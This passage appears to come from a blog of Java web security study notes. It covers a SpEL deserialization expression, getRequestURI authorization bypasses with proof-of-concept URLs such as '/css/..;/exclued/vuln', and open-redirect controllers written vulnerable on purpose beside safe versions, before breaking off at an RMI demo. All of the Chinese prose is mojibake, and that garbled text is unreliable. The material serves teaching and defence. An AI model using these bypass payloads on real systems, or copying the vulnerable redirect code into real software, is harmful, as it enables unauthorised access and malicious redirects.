æ¥å®ä¾‹åŒ–ã€‚é™¤äº†newä»¥å¤–,åƒååºåˆ—åŒ–è¿™ç§æ–¹å¼ä¹Ÿæ˜¯å¯ä»¥åˆ›å»ºå®ä¾‹çš„ã€‚æ‰€ä»¥ä½¿ç”¨<code>T(org.springframework.util.SerializationUtils).deserialize(T(com.sun.org.apache.xml.internal.security.utils.Base64).decode(&#39;rO0AB...&#39;))</code>è¿™ç§é™æ€æ–¹æ³•å®Œå…¨å¯ä»¥ã€‚<br>é™¤æ­¤ä¹‹å¤–å°±æ˜¯è¦æŠŠæ¶æ„ä»£ç å†™åœ¨é»˜è®¤çš„ç±»æ„é€ å™¨ä¸­ï¼Œå°±ä¸éœ€è¦æ˜¾ç¤ºçš„å®ä¾‹åŒ–ç±»ï¼Œä¹Ÿèƒ½æ‰§è¡Œä»£ç äº†ã€‚</p><p>å¦‚æœä»¥åé‡åˆ°å¯¹åº”çš„é—®é¢˜ä¸€å®šä¼šå»ä»”ç»†ç ”ç©¶ä¸‹ã€‚</p><h3 id="url-security-issues"><a href="#url-security-issues" class="headerlink" title="url security issues"></a>url security issues</h3><p>ä»Šå¤©æ¥å°±å‡ ä¸ªurlçš„é—®é¢˜ç¨å¾®ç ”ç©¶ä¸‹ã€‚</p><ul><li>GetRequestURI</li></ul><p>GetRequestURI.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.joychou.controller;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.AntPathMatcher;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.PathMatcher;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The difference between getRequestURI and getServletPath.</span></span><br><span class="line"><span class="comment"> * ç”±äºSpring Securityçš„&lt;code&gt;antMatchers("/css/**", "/js/**")&lt;/code&gt;æœªä½¿ç”¨getRequestURIï¼Œæ‰€ä»¥ç™»å½•ä¸ä¼šè¢«ç»•è¿‡ã€‚</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Details: https://joychou.org/web/security-of-getRequestURI.html</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Poc:</span></span><br><span class="line"><span class="comment"> * http://localhost:8080/css/%2e%2e/exclued/vuln</span></span><br><span class="line"><span class="comment"> * http://localhost:8080/css/..;/exclued/vuln</span></span><br><span class="line"><span class="comment"> * http://localhost:8080/css/..;bypasswaf/exclued/vuln</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> JoyChou @2020-03-28</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"uri"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetRequestURI</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Logger logger = LoggerFactory.getLogger(<span class="keyword">this</span>.getClass());</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(value = <span class="string">"/exclued/vuln"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">exclued</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String[] excluedPath = &#123;<span class="string">"/css/**"</span>, <span class="string">"/js/**"</span>&#125;;</span><br><span class="line">        String uri = request.getRequestURI(); <span class="comment">// Security: request.getServletPath()</span></span><br><span class="line">        PathMatcher matcher = <span class="keyword">new</span> AntPathMatcher();</span><br><span class="line"></span><br><span class="line">        logger.info(<span class="string">"getRequestURI: "</span> + uri);</span><br><span class="line">        logger.info(<span class="string">"getServletPath: "</span> + request.getServletPath());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String path : excluedPath) &#123;</span><br><span class="line">            <span class="keyword">if</span> (matcher.match(path, uri)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"You have bypassed the login page."</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"This is a login page &gt;..&lt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>geteRequestURIå®é™…ä¸Šæ˜¯HttpServletRequestä¸­å‡ ä¸ªè§£æURLçš„å‡½æ•°ä¸­çš„ä¸€ç§ã€‚å®ƒä¼šè¿”å›é™¤å»Hostï¼ˆåŸŸåæˆ–IPï¼‰éƒ¨åˆ†çš„è·¯å¾„ã€‚è¿™é‡Œæˆ‘ä»¬æœ¬åœ°æ¥èµ·ä¸ªé¡¹ç›®è·‘ä¸€ä¸‹ã€‚<br>æŒ‰ç…§Mi1k7eaåšå®¢ä¸­çš„jspæ›¿æ¢index.jsp  (<a href="https://xz.aliyun.com/t/7544" target="_blank" rel="noopener">https://xz.aliyun.com/t/7544</a>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  out.println(<span class="string">"getRequestURL(): "</span> + request.getRequestURL() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">  out.println(<span class="string">"getRequestURI(): "</span> + request.getRequestURI() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">  out.println(<span class="string">"getContextPath(): "</span> + request.getContextPath() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">  out.println(<span class="string">"getServletPath(): "</span> + request.getServletPath() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">  out.println(<span class="string">"getPathInfo(): "</span> + request.getPathInfo() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>èµ·ä¸€ä¸ªtomcatçš„è¯,è¦åœ¨Run=&gt;EditConfiguration å·¦è¾¹+å·æ·»åŠ ä¸€ä¸ªlocal tomcat serverã€‚å¹¶å°†é¡¹ç›®è·¯å¾„é…ç½®å¥½ã€‚æˆ‘è¿™é‡Œé…ç½®çš„æ ¹ç›®å½•æ˜¯java_sec_web.</p><p>æ¥ç€æ¥å®éªŒã€‚ä¸€ä¸‹å‡ ç§å½¢å¼çš„è®¿é—®éƒ½å¯ä»¥è®¿é—®åˆ°index.jsp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;index.jsp</span><br><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;index.jsp</span><br><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;totally_not_matter&#x2F;..&#x2F;index.jsp</span><br></pre></td></tr></table></figure><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/14.PNG" class="lazyload" data-srcset="14.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç‰¹åˆ«çš„,ä½¿ç”¨<code>;a/;bb/;ccc/index.jsp</code>ä¹Ÿå¯ä»¥è®¿é—®åˆ°ã€‚</p><p>ä»è¿™é‡Œæˆ‘ä»¬å°±èƒ½å‘ç°ã€‚ä½¿ç”¨getRequestURIä¼¼ä¹å°±æ˜¯ç›´æ¥è¿”å›æˆ‘ä»¬è¯·æ±‚è·¯å¾„hoståé¢çš„éƒ¨åˆ†ã€‚å®é™…ä¸Šåº•å±‚æºç ä¹Ÿç¡®å®æ˜¯è¿™ä¹ˆå†™çš„ã€‚æ—¢ç„¶å¦‚æ­¤å°±å¯ä»¥å¯¼è‡´æŸäº›åˆ©ç”¨urlbypassçš„æ”»å‡»ã€‚</p><p>æ¯”å¦‚è¯´,<code>/java_sec_web/info</code>è·¯å¾„ä¸‹å­˜åœ¨ä¸€ä¸ªsecret.jspå®ƒé€šè¿‡å¦‚ä¸‹ä»£ç æ¥é™åˆ¶æ²¡æœ‰æƒé™çš„äººè®¿é—®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest;</span><br><span class="line">HttpServletResponse httpServletResponse =(HttpServletResponse)servletResponse;</span><br><span class="line">String url = httpServletRequest.getRequestURI();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (url.startsWith(<span class="string">"/urltest/info"</span>)) &#123;</span><br><span class="line">    httpServletResponse.getWriter().write(<span class="string">"No Permission."</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¦‚ä¸‹è·¯å¾„åˆ™å¯ä»¥è½»æ¾bypass</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;.&#x2F;info&#x2F;secret.jsp</span><br><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;;233333&#x2F;info&#x2F;secret.jsp</span><br><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;32112323&#x2F;..&#x2F;info&#x2F;secret.jsp</span><br></pre></td></tr></table></figure><p>å›åˆ°é¡¹ç›®ä¸Šæ¥ã€‚æˆ‘ä»¬å°±å¯ä»¥ç”¨åŒæ ·çš„é“ç†è¿›è¡Œæƒé™ç»•è¿‡äº†ã€‚è¿™é‡Œç»™å‡ºçš„pathæ˜¯cssä¸jsè¿™æ ·çš„é™æ€ç›®å½•ã€‚<code>String[] excluedPath = {&quot;/css/**&quot;, &quot;/js/**&quot;};</code>æˆ‘ä»¬åŒæ ·å¯ä»¥é€šè¿‡å‡ ç§æ–¹å¼è®¿é—®ã€‚</p><p>æ‰€ä»¥å®‰å…¨çš„è§£å†³æ–¹æ¡ˆé€šå¸¸æ˜¯ä½¿ç”¨<code>getPathInfo()</code>æˆ–è€…<code>getServletPath()</code>æ¥æ›¿æ¢<code>getRequestURI()</code></p><p>ä»Šå¹´çš„ä¸€ä¸ªshiroCVEå°±æ˜¯è¿™ä¸ªæˆå› ã€‚å› ä¸ºæ‹¦æˆªå™¨å†™çš„æ—¶å€™æ‹¦æˆªäº†<code>/abc/*</code>è¿™æ ·çš„æ­£åˆ™ã€‚è€Œä½¿ç”¨<code>/abc/1/</code>æ—¶ï¼Œshiroçš„æ‹¦æˆªå™¨æ²¡æœ‰æ‹¦æˆªåˆ°ã€‚ä½†æ˜¯getRequestURIå´è®©æˆ‘ä»¬æ­£å¸¸è®¿é—®åˆ°äº†ã€‚å¯¼è‡´äº†æƒé™ç»•è¿‡ã€‚</p><ul><li>urlè§£æ</li></ul><p>è·Ÿå­¦ä¹ ssrfæ—¶é‡Œé¢å‡ºç°çš„bypass url hosté™åˆ¶æ˜¯ä¸€ä¸ªç±»å‹ã€‚å› ä¸ºæœ‰ç°æˆçš„è§£é‡Šå°±ä¸å¤šä½œè¯´æ˜äº†<a href="https://github.com/JoyChou93/java-sec-code/wiki/URL-whtielist-Bypass" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/wiki/URL-whtielist-Bypass</a></p><p>åŸºæœ¬ä¸Šè¿˜æ˜¯é€šè¿‡<code>#</code>,<code>;</code>ç­‰ç­‰æ¥è¿›è¡Œurlbypassç»•è¿‡gethostã€‚</p><ul><li>302è°ƒè½¬</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.joychou.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.RequestDispatcher;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.joychou.security.SecurityUtil;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The vulnerability code and security code of Java url redirect.</span></span><br><span class="line"><span class="comment"> * The security code is checking whitelist of url redirect.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> JoyChou (joychou@joychou.org)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 2017.12.28</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/urlRedirect"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLRedirect</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * http://localhost:8080/urlRedirect/redirect?url=http://www.baidu.com</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/redirect"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">redirect</span><span class="params">(@RequestParam(<span class="string">"url"</span>)</span> String url) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"redirect:"</span> + url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * http://localhost:8080/urlRedirect/setHeader?url=http://www.baidu.com</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/setHeader"</span>)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setHeader</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">        String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">        response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); <span class="comment">// 301 redirect</span></span><br><span class="line">        response.setHeader(<span class="string">"Location"</span>, url);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * http://localhost:8080/urlRedirect/sendRedirect?url=http://www.baidu.com</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/sendRedirect"</span>)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sendRedirect</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">        response.sendRedirect(url); <span class="comment">// 302 redirect</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Safe code. Because it can only jump according to the path, it cannot jump according to other urls.</span></span><br><span class="line"><span class="comment">     * http://localhost:8080/urlRedirect/forward?url=/urlRedirect/test</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/forward"</span>)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">forward</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">        String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">        RequestDispatcher rd = request.getRequestDispatcher(url);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            rd.forward(request, response);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Safe code of sendRedirect.</span></span><br><span class="line"><span class="comment">     * http://localhost:8080/urlRedirect/sendRedirect/sec?url=http://www.baidu.com</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/sendRedirect/sec"</span>)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendRedirect_seccode</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">        <span class="keyword">if</span> (SecurityUtil.checkURL(url) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            response.setStatus(HttpServletResponse.SC_FORBIDDEN);</span><br><span class="line">            response.getWriter().write(<span class="string">"url forbidden"</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        response.sendRedirect(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸€éƒ¨åˆ†æ›´å¤šæ˜¯å®‰å…¨ç¼–ç¨‹çš„é—®é¢˜ã€‚å¦‚æœé‡å®šå‘å‡ºç°é—®é¢˜å°±å¾ˆæœ‰å¯èƒ½ä¼šä¸xssç­‰æ¼æ´è”ç³»èµ·æ¥ã€‚æ­¤å¤„æ¶æ„ä»£ç ä¸­,ä»»æ„urléƒ½å¯ä»¥é€šè¿‡<code>setHeader</code>,<code>sendRedirect</code>å¯¼è‡´é‡å®šå‘ã€‚é™åˆ¶æ–¹æ³•åˆ™å¦‚æœ€åä¸¤ä¸ªè§£å†³æªæ–½,é™åˆ¶åªèƒ½åœ¨pathé—´è°ƒè½¬æˆ–è€…ç›´æ¥å†™å¥½<code>SecurityUtil</code>æ¥é™åˆ¶è°ƒè½¬çš„url.</p><h3 id="java-rmi"><a href="#java-rmi" class="headerlink" title="java-rmi"></a>java-rmi</h3><p>  æœ€æ—©æ¥è§¦åˆ°rmiæ˜¯åœ¨å¤ç°vulhubä¸Šfastjsonæ¼æ´æ—¶å­¦åˆ°çš„,ä½¿ç”¨jndiæ³¨å…¥æ—¶ç”¨åˆ°<code>rmi://</code>æˆ–<code>jndi://</code>ã€‚ç°åœ¨æ¥å­¦ä¹ ä¸‹rmiçš„å…·ä½“ä½¿ç”¨ï¼Œ</p><blockquote><p>RMIï¼ˆRemote Method Invocationï¼‰å³è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œæ˜¯åˆ†å¸ƒå¼ç¼–ç¨‹ä¸­çš„ä¸€ä¸ªåŸºæœ¬æ€æƒ³ã€‚<br> Java RMIæ˜¯ä¸“ä¸ºJavaç¯å¢ƒè®¾è®¡çš„è¿œç¨‹æ–¹æ³•è°ƒç”¨æœºåˆ¶ï¼Œæ˜¯ä¸€ç§ç”¨äºå®ç°è¿œç¨‹è°ƒç”¨ï¼ˆRPCï¼ŒRemote Procedure Callï¼‰çš„Java APIï¼Œèƒ½ç›´æ¥ä¼ è¾“åºåˆ—åŒ–åçš„Javaå¯¹è±¡å’Œåˆ†å¸ƒå¼åƒåœ¾æ”¶é›†ã€‚å®ƒçš„å®ç°ä¾èµ–äºJVMï¼Œå› æ­¤å®ƒæ”¯æŒä»ä¸€ä¸ªJVMåˆ°å¦ä¸€ä¸ªJVMçš„è°ƒç”¨ã€‚<br>åœ¨Java RMIä¸­ï¼Œè¿œç¨‹æœåŠ¡å™¨å®ç°å…·ä½“çš„Javaæ–¹æ³•å¹¶æä¾›æ¥å£ï¼Œå®¢æˆ·ç«¯æœ¬åœ°ä»…éœ€æ ¹æ®æ¥å£ç±»çš„å®šä¹‰ï¼Œæä¾›ç›¸åº”çš„å‚æ•°å³å¯è°ƒç”¨è¿œç¨‹æ–¹æ³•ï¼Œå…¶ä¸­å¯¹è±¡æ˜¯é€šè¿‡åºåˆ—åŒ–æ–¹å¼è¿›è¡Œç¼–ç ä¼ è¾“çš„ã€‚</p></blockquote><ul><li>design-pattern</li></ul><p>è®¾è®¡æ¨¡å¼åŒ…å«ä¸‰ä¸ªéƒ¨åˆ†ï¼š<br>1.Registryã€‚Serverç«¯å‘Registryæ³¨å†ŒæœåŠ¡,Clientç«¯ä»Registryè·å–è¿œç¨‹å¯¹è±¡çš„ä¸€äº›ä¿¡æ¯å¹¶è¿›è¡Œè°ƒç”¨ã€‚<br>2.Server æä¾›è¿œç¨‹æ–¹æ³•<br>3.Client ä½¿ç”¨è¿œç¨‹æ–¹æ³•</p><ul><li>interaction</li></ul><blockquote><p>1.é¦–å…ˆï¼Œå¯åŠ¨RMI RegistryæœåŠ¡ï¼Œå¯åŠ¨æ—¶å¯ä»¥æŒ‡å®šæœåŠ¡ç›‘å¬çš„ç«¯å£ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨é»˜è®¤çš„ç«¯å£ï¼ˆ1099ï¼‰<br>2.å…¶æ¬¡ï¼ŒServerç«¯åœ¨æœ¬åœ°å…ˆå®ä¾‹åŒ–ä¸€ä¸ªæä¾›æœåŠ¡çš„å®ç°ç±»ï¼Œç„¶åé€šè¿‡RMIæä¾›çš„Naming/Context/Registryç­‰ç±»çš„bindæˆ–rebindæ–¹æ³•å°†åˆšæ‰å®ä¾‹åŒ–å¥½çš„å®ç°ç±»æ³¨å†Œåˆ°RMI Registryä¸Šå¹¶å¯¹å¤–æš´éœ²ä¸€ä¸ªåç§°<br>3.æœ€åï¼ŒClientç«¯é€šè¿‡æœ¬åœ°çš„æ¥å£å’Œä¸€ä¸ªå·²çŸ¥çš„åç§°ï¼ˆå³RMI Registryæš´éœ²å‡ºçš„åç§°ï¼‰ï¼Œä½¿ç”¨RMIæä¾›çš„Naming/Context/Registryç­‰ç±»çš„lookupæ–¹æ³•ä»RMI Serviceé‚£æ‹¿åˆ°å®ç°ç±»ã€‚è¿™æ ·è™½ç„¶æœ¬åœ°æ²¡æœ‰è¿™ä¸ªç±»çš„å®ç°ç±»ï¼Œä½†æ‰€æœ‰çš„æ–¹æ³•éƒ½åœ¨æ¥å£é‡Œäº†ï¼Œä¾¿å¯ä»¥å®ç°è¿œç¨‹è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•</p></blockquote><ul><li>dynamic class loading</li></ul><p>ä¸€ä¸ªéå¸¸é‡è¦çš„ç‚¹ã€‚rmiæ”¯æŒæˆ‘ä»¬åœ¨æ²¡æœ‰æŸä¸ªç±»å®šä¹‰æ—¶å‰å»ä¸‹è½½è¿œç¨‹ç±»ã€‚è¿™ä¹Ÿæ˜¯jndiä¸ååºåˆ—åŒ–åº”ç”¨çš„ä¸»è¦æ‰‹æ®µã€‚åŠ¨æ€åŠ è½½çš„å¯¹è±¡classæ–‡ä»¶å¯ä»¥ä½¿ç”¨WebæœåŠ¡çš„æ–¹å¼è¿›è¡Œæ‰˜ç®¡ã€‚è¿™å¯ä»¥åŠ¨æ€çš„æ‰©å±•è¿œç¨‹åº”ç”¨çš„åŠŸèƒ½ï¼ŒRMIæ³¨å†Œè¡¨ä¸Šå¯ä»¥åŠ¨æ€çš„åŠ è½½ç»‘å®šå¤šä¸ªRMIåº”ç”¨ã€‚å®¢æˆ·ç«¯ä½¿ç”¨äº†ä¸RMIæ³¨å†Œè¡¨ç›¸åŒçš„æœºåˆ¶ã€‚RMIæœåŠ¡ç«¯å°†URLä¼ é€’ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯é€šè¿‡HTTPè¯·æ±‚ä¸‹è½½è¿™äº›ç±»ã€‚åŒæ ·å®ç°äº†åŠ¨æ€åŠ è½½ã€‚</p><ul><li>coding</li></ul><p>ä¸‹é¢æ¥å†™ä¸ªdemoã€‚è¿˜æ˜¯æŒ‰ç…§mi1k7eaå¸ˆå‚…çš„å®ä¾‹å†™æ³•å†™ä¸‹ã€‚</p><p>æœåŠ¡ç«¯è¿œç¨‹è°ƒç”¨çš„ç±»Identity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 